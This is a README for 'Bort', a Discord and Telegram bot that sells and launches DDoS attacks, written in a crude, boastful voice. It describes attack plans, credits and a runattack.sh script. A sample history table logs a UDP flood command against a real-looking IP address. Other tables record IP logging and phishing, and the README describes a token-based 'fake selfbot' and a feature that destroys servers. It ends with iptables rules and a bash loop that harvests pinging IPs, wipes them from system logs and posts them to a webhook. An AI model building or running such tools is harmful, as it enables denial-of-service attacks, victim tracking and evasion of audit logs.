# Bort
Created by TR4P$QU1D

Bort is the most advanced "*network*" bot available

Started: March 2020
Finished: Not even close.

Supported Services
  - Discord
  - Telegram

### Main Features

  - Theft Deterrent (Automatically destroy any servers the bot has forcefully been added in.) [Disabled, but togglable]
  - No Centralised Discord Servers (Everything is universal and handled via a database.) [Except the logger which can also be disabled.]
  - Automatic plan management. [Very easily expandable]
  - Simple commands to modify users as much as you wish.
  - Advanced Security and Protection.
  - Multi Net Support [Just modify runattack.sh script]

### Why?

We are *not* the first to attempt such a bot, but we are the first to accomplish it on a much greater level.
If you were to go searching you would find many "ddos" bots. The problem with all of those are simply lack of features, security, automatic user management and protection agaisnt attacks on itself. So I took it upon myself and fixed all of these whilst having it as user friendly as possible.

### Installation
Shit required:
  - Node.js v12
  - Discord.js v12
  - https://github.com/yagop/node-telegram-bot-api
  - setup ur shit in the config file

### Extras
 There is so much fucking that I have no mentioned I encourage you to read the entire bot.js


### Remote Bort Execution (aka fake selfbot)

 just put ur token in one the files and run it

 you will need to setup a webhook in the .webhook file for it to use to connect to bort

 This webhook needs to be configured inside bot.js aswell so it gets picked up.

### Info

 Basically been working on this from scratch everyone thinks i skidripped another bot but thats obviously not true.

 Ik the leaked version is shitty first time coding. since then the entire bot has been rewritten.

 Also, Yes im a skid definetly a skid.

### Database Setup
  I aint gonna give you all the shit but heres hows it layed out

  This is the "user" table.
  ```
+------+----+------+------+--------------+-------------+----------+-------+-------+---------+-------+---------+---------------+--------+------------+--------------------+------------------+----------------+----------------+--------------------+
| user | id | tid  | plan | spongeExpiry | spongeAddOn | verified | admin | phish | addToDB | token | credits | captchaAnswer | expiry | lastAttack | freeAttackCooldown | godzillaCooldown | spongeCooldown | globalCooldown | 7dayCreditCooldown |
+------+----+------+------+--------------+-------------+----------+-------+-------+---------+-------+---------+---------------+--------+------------+--------------------+------------------+----------------+----------------+--------------------+
| null | 0  | 0    | 0    | 0            | 0           | 1        | 0     | 0     | 0       | 0     | 5000    | 0             | 000000 | 0          | 0                  | 0                | 0              | 0              | 0                  |
+------+----+------+------+--------------+-------------+----------+-------+-------+---------+-------+---------+---------------+--------+------------+--------------------+------------------+----------------+----------------+--------------------+
```

  This is the "blackjack" table
```  
+--------------------+------------------------------+---------+----------+-----------+
| id                 | gameState                    | isStand | botCards | userCards |
+--------------------+------------------------------+---------+----------+-----------+
| 150798058769219584 | 0                            | NULL    | 0        | 0         |
+--------------------+------------------------------+---------+----------+-----------+
```

  This is the "jobs" table
```
+--------------------+------------------+--------+----------+
| id                 | job              | amount | lastWork |
+--------------------+------------------+--------+----------+
| 305921615282307083 | Tittie Inspector | 99999  | 0        |
+--------------------+------------------+--------+----------+
```

  This is the "poker" table
  ```
+--------------------+---------+--------+-----------+-----+-------+-------------+
| id                 | moveNum | gameid | isWaiting | bet | cards | hiddenCards |
+--------------------+---------+--------+-----------+-----+-------+-------------+
| 150798058769219584 | 0       | 0      | 0         | 0   | 0     | 0           |
+--------------------+---------+--------+-----------+-----+-------+-------------+
```
  This is the "coolDowns" table
```
+--------------------+---------------+
| id                 | vpn           |
+--------------------+---------------+
| 760340299871813683 | 1601666926496 |
+--------------------+---------------+
```
  This is the "history" table
  ```
 +----+--------------------+---------------+-----------------------------------+---------------+
| id | user               | date          | command                           | ends          |
+----+--------------------+---------------+-----------------------------------+---------------+
|  1 | 766886270088904715 | 1603154761059 | kraken udp 100.38.224.87 120 3074 | 1603154761179 |
+----+--------------------+---------------+-----------------------------------+---------------+
  ```
  This is the "iplogger" table
  ```
  +--------------------+--------+-----------+----------+-------+---------------+----------------+
  | id                 | server | listenFor | private  | phish | openDM        | expiry         |
  +--------------------+--------+-----------+----------+-------+---------------+----------------+
  | 207176591132983296 | vps1   | 0         | 0        | 0     | 1606054640497 | 1606153497428  |
  | 364944664694095873 | 1      | 0         | 0        | 0     | 0             | 1606929697453  |
  | 522462952951906318 | 0      | 0         | 0        | 0     | 1605239176977 | 1608722846147  |
  | 551499467929681920 | 1      | 0         | 0        | 0     | 1604333831399 | 1606400195926  |
  | 610713032733229057 | 1      | vps1      | 0        | 1     | 1606274121123 | 1608518593290  |
  | 630049548219187220 | 1      | 0         | 0        | 0     | 1603936373580 | 1606527672602  |
  | 656641191076691990 | 1      | 0         | 0        | 0     | 0             | 1605798543957  |
  | 681978514366529549 | VPS1   | 0         | 0        | 0     | 1606133674951 | 1605808773123  |
  | 701350931937230858 | 1      | 0         | 0        | 0     | 0             | 28388186892382 |
  | 752619940195991604 | 1      | 0         | 0        | 0     | 1604229238342 | 1604598202368  |
  | 759703020841336852 | VPS1   | 0         | 0        | 0     | 0             | 1605805299637  |
  | 759930160627056680 | 1      | 0         | 0        | 0     | 0             | 1606860997840  |
  | 760214330435174472 | 1      | 0         | 0        | 0     | 0             | 1606847326375  |
  | 760340299871813683 | 1      | 0         | private1 | 1     | 1604271936957 | 1606237190728  |
  | 760687371209146450 | 1      | 0         | 0        | 0     | 1605583498027 | 1607487481459  |
  | 760799347402473482 | 1      | 0         | 0        | 0     | 0             | 1607802188756  |
  | 760994414704853012 | 1      | 0         | 0        | 0     | 0             | 1607013528284  |
  | 76475788678122701  | 1      | 0         | 0        | 0     | 0             | 1607586592419  |
  | 764757886781227018 | 1      | 0         | 0        | 0     | 0             | 1607586641360  |
  | 765260625525080098 | 1      | 0         | private1 | 0     | 1606253767442 | 1606861483654  |
  | 771368393029845024 | 1      | 0         | 0        | 0     | 1604684203234 | 1606665100413  |
  | 772878305388265492 | 1      | vps1      | 0        | 1     | 1605933924350 | 28388186892382 |
  | 772878310219710476 | 1      | 0         | 0        | 1     | 0             | 1608570853102  |
  | 772880829898686475 | 1      | 0         | 0        | 0     | 1605260084583 | 1607542744800  |
  | 772900246828875806 | staff  | 0         | 0        | 0     | 1605767015212 | 1607166749962  |
  | 779537245166239794 | 0      | 0         | 0        | 0     | 0             | 1608565709700  |
  +--------------------+--------+-----------+----------+-------+---------------+----------------+
```

### Pinger IP logger

Setup on centos 6
Follow the installation for discord.sh

It will send the logged ips to a webhook in a designated channel that bort will listen in.
You can set the channel id down near the bottom of bot.js.


Defence IP Tables [Access the servers from VNC]
```
iptables -A INPUT -p icmp --icmp-type echo-request -j LOG --log-prefix "PING_1: "
iptables -A INPUT -p icmp --icmp-type echo-request -j ACCEPT
iptables -A OUTPUT -p icmp  --icmp-type echo-request -j ACCEPT
iptables -A INPUT -p tcp -s IP_TO_CONTROL_FROM --dport 5900 -j ACCEPT
iptables -I OUTPUT -o eth0 -d 0.0.0.0/0 -j ACCEPT
iptables -I INPUT -i eth0 -m state --state ESTABLISHED,RELATED -j ACCEPT
iptables -A INPUT -p tcp -j DROP
iptables -A INPUT -p udp -j DROP
```
Run this script to keep it running
```
#!/bin/bash
while true; do
cat /var/log/messages | grep 'PING_1: ' | sed 's/.*SRC=//' | sed 's/ DST.*//' | tail -1 > .temp
ip=$(cat .temp)
if [[ $ip == *"."* ]]; then
  echo $ip
  sed -i "/$ip/d" /var/log/messages
  service rsyslog restart
  /root/discord.sh --text "VPS1 $ip"
fi
sleep 1
done
```
